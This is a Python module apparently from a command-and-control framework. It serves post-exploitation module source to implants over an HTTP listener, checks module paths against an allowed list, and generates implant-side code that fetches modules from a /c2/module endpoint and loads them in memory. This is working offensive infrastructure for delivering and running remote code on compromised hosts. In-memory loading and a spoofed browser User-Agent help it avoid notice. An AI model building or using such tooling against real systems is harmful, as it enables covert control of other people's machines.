#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Serve implant-side remote module source over the HTTP polling listener."""

from __future__ import annotations

import os
from typing import Optional

from lib.c2.remote_module_client import RemoteModuleSpec, compute_sha256


ALLOWED_MODULE_PREFIXES = (
    "post/",
    "prestage/",
    "auxiliary/",
)


def _normalize_module_path(module_path: str) -> str:
    return str(module_path or "").strip().strip("/").replace("\\", "/")


def _module_allowed(module_path: str) -> bool:
    path = _normalize_module_path(module_path)
    if not path or ".." in path.split("/"):
        return False
    return any(path.startswith(prefix) for prefix in ALLOWED_MODULE_PREFIXES)


def resolve_remote_module(framework, module_path: str, *, language: str = "python") -> Optional[RemoteModuleSpec]:
    """Load module source text for remote execution on an implant."""
    path = _normalize_module_path(module_path)
    if not _module_allowed(path):
        return None

    loader = getattr(framework, "module_loader", None)
    if loader is None:
        return None

    try:
        primary, alternate = loader._module_file_candidates(path)
    except Exception:
        return None

    resolved = None
    for candidate in (primary, alternate):
        if candidate and os.path.isfile(candidate):
            resolved = candidate
            break
    if not resolved:
        return None

    try:
        with open(resolved, "r", encoding="utf-8", errors="replace") as fh:
            content = fh.read()
    except Exception:
        return None

    if not content.strip():
        return None

    digest = compute_sha256(content.encode("utf-8"))
    info = {}
    try:
        mod = loader.load_module(path, load_only=True, framework=framework, silent=True)
        if mod is not None:
            info = getattr(type(mod), "__info__", {}) or {}
    except Exception:
        info = {}

    return RemoteModuleSpec(
        module_path=path,
        language=str(language or "python").strip().lower(),
        version=str(info.get("version") or "1.0.0"),
        sha256=digest,
        content=content,
    )


def build_http_fetch_helper(*, url_prefix: str = "/c2") -> str:
    """Return Python source that fetches modules via GET /c2/module (in-memory load)."""
    from lib.c2.memimporter import build_memimporter_bootstrap

    prefix = str(url_prefix or "/c2").rstrip("/")
    mem = build_memimporter_bootstrap()
    return mem + f'''

def _kitty_fetch_module_http(module_path, base_url=None, client_id=None, language="python"):
    import json as _j
    import urllib.parse as _up
    import urllib.request as _ur
    base = base_url or globals().get("BASE", "")
    cid = client_id or globals().get("CID", "")
    q = _up.urlencode({{"path": module_path, "language": language, "id": cid}})
    url = base + "{prefix}" + "/module?" + q
    req = _ur.Request(url, method="GET", headers={{"User-Agent": globals().get("UA", "Mozilla/5.0")}})
    with _ur.urlopen(req, timeout=60) as _resp:
        raw = _resp.read()
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", errors="replace")
    data = _j.loads(raw)
    content = data.get("content") or ""
    digest = data.get("sha256") or ""
    import hashlib as _h
    if digest and _h.sha256(content.encode()).hexdigest() != digest:
        raise ValueError("remote module digest mismatch")
    return _kitty_load_module_from_source(module_path, content)
'''.strip()
